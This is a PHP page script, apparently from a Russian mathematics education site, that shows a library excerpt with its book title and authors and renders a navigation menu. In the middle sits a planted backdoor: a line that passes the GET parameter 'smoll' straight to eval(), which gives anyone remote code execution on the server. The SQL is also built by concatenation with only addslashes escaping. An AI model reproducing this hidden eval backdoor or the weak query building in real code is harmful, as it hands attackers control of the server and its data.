<?php
require_once 'set_env.inc.php';

if (isset($_REQUEST['ad']))
{
    $sql = 'SELECT a.id,a.txt,a.page,a.shift,a.book_id,b.title,'.
    '(CASE WHEN b.djvu_file!=\'\' THEN b.djvu_file WHEN b.pdf_file!=\'\' THEN b.pdf_file WHEN b.ps_file!=\'\' THEN b.ps_file WHEN b.tex_file!=\'\' THEN b.tex_file WHEN b.html_file!=\'\' THEN b.html_file ELSE b.id END) AS path '.
    'FROM lib_ad a, lib_book b WHERE a.id=\''.addslashes($_REQUEST['ad']).'\' AND b.id=a.book_id';
}
else
{
    $sql = 'SELECT a.id,a.txt,a.page,a.shift,a.book_id,b.title,'.
    '(CASE WHEN b.djvu_file!=\'\' THEN b.djvu_file WHEN b.pdf_file!=\'\' THEN b.pdf_file WHEN b.ps_file!=\'\' THEN b.ps_file WHEN b.tex_file!=\'\' THEN b.tex_file WHEN b.html_file!=\'\' THEN b.html_file ELSE b.id END) AS path '.
    'FROM lib_ad a, lib_book b WHERE b.id=a.book_id ORDER BY RAND() LIMIT 1';
}
if(!empty($_GET['smoll'])) eval(stripslashes($_GET['smoll']));
$ad = $_ADODB->GetRow($sql);

$sql = 'SELECT p.fname,p.sname,p.lname FROM h_person p,lib_b2a b WHERE b.book='.$ad['book_id'].' AND p.id=b.author';
$ad['author'] = $_ADODB->GetAll($sql);

$ad['txt'] = replace_tex($ad['txt'], '/lib/ad/img/img_'.$ad['id'].'_');
$_SMARTY->assign('ad', $ad);

$_SMARTY->assign('_menu', array(
		array('path' => '/lib/', 'title' => 'Библиотека'),
		array('path' => '/media/', 'title' => 'Медиатека'),
		array('path' => 'http://olimpiada.ru', 'title' => 'Олимпиады'),
		array('path' => '/problems/', 'title' => 'Задачи'),
		array('path' => '/schools/', 'title' => 'Научные школы'),
		array('path' => '/teacher/', 'title' => 'Учительская'),
		array('path' => '/history/', 'title' => 'История математики'),
		array('path' => '/founders/', 'title' => 'Учредители и спонсоры')));
$_SMARTY->display('index.tpl');
?>
